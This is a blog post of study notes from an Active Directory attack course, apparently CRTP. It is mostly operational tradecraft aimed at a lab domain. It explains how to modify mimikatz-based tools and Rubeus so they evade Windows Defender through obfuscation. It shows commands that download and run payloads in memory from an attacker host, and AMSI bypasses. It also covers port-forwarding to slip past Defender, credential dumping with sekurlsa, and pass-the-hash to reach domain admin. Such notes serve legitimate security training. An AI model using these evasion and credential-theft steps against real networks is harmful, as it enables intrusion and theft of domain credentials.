---
title: "4 - Offensive .NET"
classes: single
header:  
  teaser: /assets/images/posts/crtp/crtp-teaser5.jpg
  overlay_image: /assets/images/main/header5.jpg
  overlay_filter: 0.5
ribbon: Firebrick
excerpt: "Use Minimal obfuscation and String manipulation to bypass Win Defender"
description: "Use Minimal obfuscation and String manipulation to bypass Win Defender"
categories:
  - notes
  - crtp
tags:
  - beginner
  - AD
  - Windows
  - bypass 
toc: true
---

# Offensive .NET

**A repo of popular Offensive C# tools**:

[SharpCollection on GitHub](https://github.com/Flangvik/SharpCollection)

[Mimikatz on GitHub](https://github.com/gentilkiwi/mimikatz)


## Tradecraft - AV bypass

> We will focus mostly on bypass of signature based detection by Windows Defender

For that, we can use techniques like Obfuscation, String Manipulation etc.

We can use DefenderCheck:

[DefenderCheck on GitHub](https://github.com/matterpreter/DefenderCheck)

> To identify code and strings from a binary that Windows Defender may flag.

This helps us in deciding on modifying the source code and minimal obfuscation.


### SharpKatz

Let's check SharpKatz.exe for signatures using DefenderCheck
```powershell
DefenderCheck.exe <Path to Sharpkatz binary>
```

- Open the project in Visual Studio.
- Press **CTRL + H**
- Find and replace the string "Credentials" with "Credents" you can use any other string as an replacement. (Make sure that string is not present in the code)
- Select the scope as **Entire Solution**.
- Press **Replace All** button.
- Build and recheck the binary with *DefenderCheck*.
- Repeat above steps if still there is detection

### Safetykatz

For SafetyKatz, we used the following steps
- Download latest version of Mimikatz and **Out-CompressedDll.ps1**

Run the Out-CompressedDll.ps1 PowerShell script on Mimikatz binary and save the output to a file
```powershell
Out-CompressedDll <Path to mimikatz.exe> > 	outputfilename.txt
```	

[Out-CompressedDll.ps1 in PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/ScriptModification/Out-CompressedDll.ps1)


- Copy the value of the variable **$EncodedCompressedFile** from the output file above and replace the value of **compressedMimikatzString** variable in the **Constants.cs** file of SafetyKatz.

- Copy the byte size from the output file and replace it in **Program.cs** file on the line 111 & 116.
- Build and recheck the binary with *DefenderCheck*

### BetterSafetyKatz

For BetterSafetyKatz, we used the following steps
- Download the latest release of "mimikatz_trunk.zip" file.
- Convert the file to base64 value

![Alt text](/assets/images/posts/crtp/3.png){: .align-center}




Modify the **Program.cs** file.

– Added a new variable that contains the base64 value of **mimikatz_trunk.zip** file.
– Comment the code that downloads or accepts the mimikatz file as an argument.
– Convert the base64 string to bytes and pass it to **zipStream** variable

![Alt text](/assets/images/posts/crtp/4.png){: .align-center}




### Rubeus

For Rubeus.exe, we used **ConfuserEx** to obfuscate the binary

[ConfuserEx on GitHub](https://github.com/mkaring/ConfuserEx)


Launch ConfuserEx:
- In Project tab select the Base Directory where the binary file is located.
- In Project tab Select the Binary File that we want to obfuscate.
- In Settings tab add the rules.
- In Settings tab edit the rule and select the preset as **Normal**.
- In Protect tab click on the protect button.

> We will find the new obfuscated binary in the Confused folder under the Base Directory.

![Alt text](/assets/images/posts/crtp/5.png){: .align-center}



- After obfuscating the binary with ConfuserEx rescan using DefenderCheck we can see the detection of GUID.
- Generate and modify the GUID and compile Rubeus again and rerun the ConfuserEx on the Rubeus.exe binary.

![Alt text](/assets/images/posts/crtp/6.png){: .align-center}



## Payload Delivery     


We can use NetLoader to deliver our binary payloads.

[NetLoader on GitHub](https://github.com/Flangvik/NetLoader)


It can be used to load binary from filepath or URL and patch AMSI & ETW while executing:
```powershell
C:\Users\Public\Loader.exe -path http://192.168.100.X/SafetyKatz.exe
```

We also have AssemblyLoad.exe that can be used to load the Netloader in-memory from a URL which then loads a binary from a filepath or URL:
```powershell
C:\Users\Public\AssemblyLoad.exe http://192.168.100.X/Loader.exe -path http://192.168.100.X/SafetyKatz.exe
```

### [1] - Getting DA through dcorp-ci
```powershell
iex (iwr http://<ip>/sbloggingbypass.txt -UseBasicParsing)
# bypass ASMI manually
iex ((New-Object Net.WebClient).DownloadString('http://<ip>/PowerView.ps1'))
FInd-DomainUserLocation
winrs -r:<machine> <command> //example winrs -r:dcorp-mgmt hostname;whoami
iwr http://<ip>/Loader.exe -OutfFile C:\Users\Public\Loader.exe
echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
```


> [NOTE] Windows Defender will block all binaries/executables that are downloaded from remote sources
So, we will configure a portforward to request payload from local loopback. 

> Even if Defender is watching this, because is not remotely the payload its not blocked

```powershell
$null | winrs -r:dcorp-mgmt “netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=<attacker IP>”
$null | winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
```

Create a new PS with high integrity:
```powershell
Rubeus.exe asktgt /user:svcadmin /aes256:<dc hash> /opsec /creanetonly:C:\windows\System32\cmd.exe /show /ptt
```


### [2] - Getting DA through derivative local admin

```powershell
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess -Verbose

Enter-PSSession <the machine we have local admin access>
```

> we have to bypass AMSI here, but the shell is in **ConstrainedLanguage** Mode

```powershell
$ExecutionContext.SessionState.LanguageMode
```

> we need to search what kind o policy is blocking us : **applocker**, **wdigest**
 
 ```powershell  
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```
or
```powershell
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2 # "AppLocker = Software Restrict Policy Version 2"
```

Lets copy mimiEx to the target machine

From attacker:
```powershell
Copy-Item C:\AD\Tools\Invoke-MimiEx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
```

> Enter the machine again with PSSession and execute the MimiEx.ps1


From attacker:
```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe “sekurlsa::opassth” /user:srvadmin /domain:dollarcorp.moneycorp.local /aes256:<hash> /run:cmd.exe" “exit”
```

- This will open a shell with the hash we got with **mimiEx**
- Firstly found what machines this user has local admin access

> [EXTRA] **Session: Service From 0** = means that there is a service using the account as a service account
> so, there is a chance of cached cleartext password on mimikatz results



In the new shell:
```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess -Verbose
```

> At this point, we can access dump the credentials like we did before in the last path
> Opening a portforward and dump through local loopback                                          ]

